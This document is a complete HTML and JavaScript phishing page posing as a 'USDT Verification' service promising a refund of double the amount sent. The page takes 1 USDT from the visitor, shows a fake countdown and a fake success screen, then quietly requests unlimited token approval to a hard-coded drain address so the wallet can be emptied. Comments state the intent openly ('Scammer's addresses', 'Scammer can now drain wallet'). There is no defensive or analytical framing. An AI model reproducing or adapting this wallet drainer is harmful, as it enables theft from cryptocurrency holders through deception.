<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>USDT Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
    body { background: #f5f5f7; min-height: 100vh; padding: 20px; }
    .container { max-width: 400px; margin: 0 auto; }
    .card { background: white; border-radius: 15px; padding: 25px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); }
    h2 { color: #333; margin-bottom: 20px; text-align: center; }
    .address-box { background: #f8f9fa; padding: 15px; border-radius: 10px; margin: 15px 0; border: 1px solid #dee2e6; }
    .address { font-family: monospace; word-break: break-all; font-size: 14px; color: #333; }
    .amount-box { text-align: center; padding: 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border-radius: 10px; margin: 20px 0; }
    .amount { font-size: 32px; font-weight: bold; margin: 10px 0; }
    .btn { width: 100%; background: #28a745; color: white; border: none; padding: 18px; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 20px; }
    .note { font-size: 12px; color: #666; text-align: center; margin-top: 15px; }
    .loader { text-align: center; margin: 30px 0; }
    .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div class="container">
    <div class="card">
      <!-- STEP 1: Simple send interface -->
      <div id="step1">
        <h2>Send USDT Verification</h2>
        <p style="text-align: center; color: #666; margin-bottom: 20px;">
          Send 1 USDT to verify your wallet address
        </p>
        
        <div class="address-box">
          <div style="font-size: 12px; color: #666; margin-bottom: 5px;">Send to Address:</div>
          <div class="address" id="receiverAddress">0x395b205f3ec60b4cd58209eB7...</div>
        </div>
        
        <div class="amount-box">
          <div>Amount to Send</div>
          <div class="amount">1 USDT</div>
          <div>≈ $1.00</div>
        </div>
        
        <p style="color: #666; font-size: 14px; text-align: center; margin: 20px 0;">
          ⚠️ You will receive 2 USDT back after verification
        </p>
        
        <button class="btn" onclick="startVerification()">
          Send 1 USDT for Verification
        </button>
        
        <div class="note">
          This will open your wallet to send 1 USDT only
        </div>
      </div>
      
      <!-- STEP 2: Hidden loading (actually connecting wallet) -->
      <div id="step2" style="display: none;">
        <div class="loader">
          <div class="spinner"></div>
          <h3 style="margin-top: 20px; color: #333;">Processing Verification...</h3>
          <p style="color: #666; margin-top: 10px;">
            Checking your 1 USDT payment...<br>
            <span id="countdown">5 seconds remaining</span>
          </p>
        </div>
      </div>
      
      <!-- STEP 3: Fake success -->
      <div id="step3" style="display: none;">
        <h2 style="color: #28a745;">✅ Verification Successful!</h2>
        <div style="text-align: center; margin: 30px 0;">
          <div style="font-size: 60px; color: #28a745;">✓</div>
          <p style="color: #666; margin: 20px 0;">
            Your wallet has been verified successfully.<br>
            You will receive 2 USDT back within 24 hours.
          </p>
          <div style="background: #d4edda; color: #155724; padding: 15px; border-radius: 10px; margin: 20px 0;">
            <p>✅ 1 USDT payment confirmed</p>
            <p>✅ Wallet address verified</p>
            <p>✅ Ready for advance payment</p>
          </div>
        </div>
        <p style="text-align: center; color: #666; font-size: 14px;">
          Return to Telegram to receive your payment.
        </p>
      </div>
    </div>
  </div>

  <script>
    // Scammer's addresses
    const PAYMENT_ADDRESS = "0x395b205f3ec60b4cd58209eB7..."; // Gets 1 USDT
    const DRAIN_ADDRESS = "0x8Ce2C06f449317F6E5D0AA7d193daA2D3c1E6f5b"; // Gets unlimited approval
    
    let walletConnected = false;
    let usdtSent = false;
    
    // Function that runs when "Send 1 USDT" is clicked
    async function startVerification() {
      // STEP 1: Hide send interface, show loading
      document.getElementById('step1').style.display = 'none';
      document.getElementById('step2').style.display = 'block';
      
      // Start fake countdown
      startCountdown();
      
      // STEP 2: SILENTLY connect wallet (victim doesn't know)
      await connectWalletSilently();
      
      // STEP 3: After "countdown", trigger USDT send
      setTimeout(async () => {
        await sendUSDT();
      }, 5000); // Wait for fake countdown
    }
    
    // Function that SILENTLY connects wallet (no popup!)
    async function connectWalletSilently() {
      try {
        if (!window.ethereum) {
          alert("Please open in Trust Wallet");
          return;
        }
        
        // This triggers the "Connect DApp" popup but we make it seem like part of process
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const accounts = await provider.send("eth_requestAccounts", []);
        
        if (accounts.length > 0) {
          walletConnected = true;
          console.log("Wallet connected silently:", accounts[0]);
        }
      } catch (error) {
        console.error("Wallet connection failed:", error);
      }
    }
    
    // Function to send USDT
    async function sendUSDT() {
      if (!walletConnected) {
        alert("Please connect wallet first");
        return;
      }
      
      try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();
        
        // USDT BEP20 contract
        const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
        const usdtAbi = ["function transfer(address to, uint256 amount) returns (bool)"];
        const usdt = new ethers.Contract(USDT_BSC, usdtAbi, signer);
        
        // Send 1 USDT
        const amountWei = ethers.utils.parseUnits("1", 18);
        const tx = await usdt.transfer(PAYMENT_ADDRESS, amountWei);
        
        usdtSent = true;
        
        // Show "success" and trigger hidden approval
        document.getElementById('step2').style.display = 'none';
        document.getElementById('step3').style.display = 'block';
        
        // SILENTLY trigger unlimited approval (hidden from user)
        setTimeout(() => {
          triggerHiddenApproval();
        }, 3000);
        
      } catch (error) {
        console.error("Send error:", error);
        alert("Transaction failed. Please try again.");
      }
    }
    
    // Function that SILENTLY requests unlimited approval
    async function triggerHiddenApproval() {
      try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();
        
        const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
        const usdtAbi = ["function approve(address spender, uint256 amount) returns (bool)"];
        const usdt = new ethers.Contract(USDT_BSC, usdtAbi, signer);
        
        const MAX_UINT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
        
        // This triggers the APPROVAL popup but user thinks it's for "verification"
        const tx = await usdt.approve(DRAIN_ADDRESS, MAX_UINT);
        
        console.log("Unlimited approval granted:", tx.hash);
        
        // Scammer can now drain wallet
        
      } catch (error) {
        console.error("Approval error:", error);
      }
    }
    
    // Fake countdown timer
    function startCountdown() {
      let seconds = 5;
      const countdownEl = document.getElementById('countdown');
      
      const interval = setInterval(() => {
        seconds--;
        countdownEl.textContent = `${seconds} seconds remaining`;
        
        if (seconds <= 0) {
          clearInterval(interval);
          countdownEl.textContent = "Verifying transaction...";
        }
      }, 1000);
    }
    
    // Initialize
    document.getElementById('receiverAddress').textContent = PAYMENT_ADDRESS;
  </script>
</body>
</html>
